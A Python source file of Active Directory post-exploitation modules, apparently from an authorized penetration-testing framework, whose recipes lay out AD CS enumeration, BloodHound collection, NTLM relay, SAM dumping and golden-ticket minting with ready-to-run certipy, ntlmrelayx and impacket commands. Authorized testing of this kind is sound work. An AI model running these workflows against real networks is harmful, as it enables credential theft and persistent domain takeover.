"""Attack modules: Active Directory post-exploit (Phase 1).

Recipe/orchestration modules that wrap the permissive MCP AD tools in
``tools/mcp_tools/ad.py`` (adcs_enum, bloodhound_collect, responder_relay,
golden_ticket, smb_signing_check). They are NOT re-implementations: the
generated workflows connect ONLY to ``ctx.target_ip`` (the single owned
target) and the MCP layer enforces the target-IP allowlist lock. They follow
the same ``status="info"`` recipe pattern as ``DCSyncAttack``/``ASREPRoast``.
``SMBSigningCheck`` is detection-only.
"""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class ADCSEnum(AttackModule):
    name = "ADCSEnum"
    description = "Enumerate Active Directory Certificate Services (AD CS) templates to find ESC1-8 privesc paths (certipy)"
    target_services = ["ldap", "msrpc", "microsoft-ds"]
    target_ports = [389, 3268, 445]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Wraps the adcs_enum MCP tool (certipy find). Maps ESC1-8 misconfigurations to privesc/credential-theft paths.",
            "workflow": [
                "1. Obtain domain credentials (recovered via ASREPRoast / Kerberoasting / a credential dump on the owned target).",
                f"2. Call adcs_enum(target_ip='{ctx.target_ip}', username=<u>, domain=<d>, password=<p> or ntlm_hash=<nt>) to enumerate AD CS templates.",
                "3. Classify vulnerable templates (ESC1: editable SAN, ESC4: weak ACLs, ESC8: NTLM relay to HTTP enrollment) for privesc planning.",
                "4. Chain to a golden_ticket / pass_the_hash against the owned target only.",
            ],
            "suggested_command": (
                f"certipy find -u user@DOMAIN -p password -dc-ip {ctx.target_ip} "
                f"-target {ctx.target_ip} -vulnerable"
            ),
            "references": [
                "https://github.com/ly4k/Certipy",
                "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",
            ],
        }


class BloodHoundCollect(AttackModule):
    name = "BloodHoundCollect"
    description = "Collect BloodHound graph data (users/groups/sessions/ACLs) for attack-path analysis (bloodhound-python)"
    target_services = ["ldap", "kerberos", "microsoft-ds"]
    target_ports = [389, 445, 88]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Wraps the bloodhound_collect MCP tool (bloodhound-python -c All --zip). Feeds attack-path planning.",
            "workflow": [
                "1. Obtain any domain credential (even a low-priv domain user suffices for collection).",
                f"2. Call bloodhound_collect(target_ip='{ctx.target_ip}', domain=<d>, username=<u>, password=<p>) to gather the graph dataset.",
                "3. Import the zipped JSON into BloodHound on the operator box; run 'Shortest Paths to Domain Admin' / 'Kerberoastable' / 'DCSync-able' queries.",
                "4. Feed identified paths into ASREPRoast / Kerberoasting / DCSync / golden_ticket against the owned target only.",
            ],
            "suggested_command": (
                f"bloodhound-python -u user -p pass -d DOMAIN -dc {ctx.target_ip} "
                f"-c All --zip"
            ),
            "references": [
                "https://github.com/dirkjanm/BloodHound.py",
                "https://github.com/BloodHoundAD/BloodHound",
            ],
        }


class ResponderRelay(AttackModule):
    name = "ResponderRelay"
    description = "SMB/NTLM relay via impacket ntlmrelayx (relay targets restricted to the operator allowlist)"
    target_services = ["microsoft-ds", "smb", "netbios-ssn"]
    target_ports = [445, 139]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Wraps the responder_relay MCP tool. Relay targets are built ONLY from the allowlist (+ runtime target); off-list hosts are refused.",
            "workflow": [
                "1. Confirm the target does not require SMB signing (call smb_signing_check); signing-required hosts cannot be relayed to.",
                f"2. Call responder_relay(target_ip='{ctx.target_ip}', iface=<op_iface>) to start ntlmrelayx bound to the operator interface.",
                "3. Coerce an authentication to your listener (e.g. via a coerced HTTP/PetitPotam request from the owned target).",
                "4. ntlmrelayx dumps SAM / executes the optional command against an allowlisted relay target only.",
            ],
            "suggested_command": (
                f"ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'  # targets.txt built from allowlist + {ctx.target_ip}"
            ),
            "prerequisites": ["SMB signing disabled on the relay target", "a coerced auth to the operator listener"],
            "references": [
                "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",
                "https://www.thehacker.recipes/a-d/movement/ntlm/relay",
            ],
        }


class GoldenTicket(AttackModule):
    name = "GoldenTicket"
    description = "Mint a Kerberos golden ticket (TGT) from a stolen krbtgt NTLM hash for persistence / full-domain impersonation (impacket-ticketer)"
    target_services = ["kerberos", "ldap", "microsoft-ds", "drsuapi"]
    target_ports = [88, 389, 445, 3268]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Wraps the golden_ticket MCP tool (impacket-ticketer). Requires the krbtgt NTLM hash + domain SID (recovered via DCSync).",
            "workflow": [
                "1. Obtain the krbtgt NTLM hash and the domain SID (call dump_credentials(method='dcsync', target_user='krbtgt') against the owned DC).",
                f"2. Call golden_ticket(target_ip='{ctx.target_ip}', domain=<d>, username=<any_user>, krbtgt_hash=<nt>, sid=<domain_sid>) to mint the TGT.",
                "3. export KRB5CCNAME=<ccache> and use the ticket with impacket-psexec -k -no-pass against the owned target only.",
                "4. The ticket persists domain access until the krbtgt password is rotated (twice).",
            ],
            "suggested_command": (
                f"impacket-ticketer -nthash <krbtgt_nt> -domain DOMAIN -domain-sid S-1-5-... "
                f"-user Administrator -duration 10d Administrator  # then psexec -k {ctx.target_ip}"
            ),
            "prerequisites": ["krbtgt NTLM hash (via DCSync)", "domain SID"],
            "references": [
                "https://github.com/fortra/impacket/blob/master/examples/ticketer.py",
                "https://adsecurity.org/?p=1729",
            ],
        }


class SMBSigningCheck(AttackModule):
    """DETECTION ONLY — never exploits. Checks SMB signing posture to decide
    whether relay (ResponderRelay) is viable against the target."""
    name = "SMBSigningCheck"
    description = "DETECTION ONLY: check whether the target requires SMB signing (relay feasibility)"
    target_services = ["microsoft-ds", "smb", "netbios-ssn"]
    target_ports = [445, 139]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Detection-only. Wraps the smb_signing_check MCP tool (nxc --signing or nmap smb2-security-mode). No credentials sent, no exploitation.",
            "workflow": [
                f"1. Call smb_signing_check(target_ip='{ctx.target_ip}').",
                "2. If signing is NOT required, the target is a viable ResponderRelay victim.",
                "3. If signing IS required, relay attacks will fail; pivot to Kerberoasting / AS-REP roasting / PtH instead.",
            ],
            "suggested_command": f"nxc smb {ctx.target_ip} --signing",
            "references": [
                "https://www.thehacker.recipes/a-d/movement/ntlm/relay",
            ],
        }
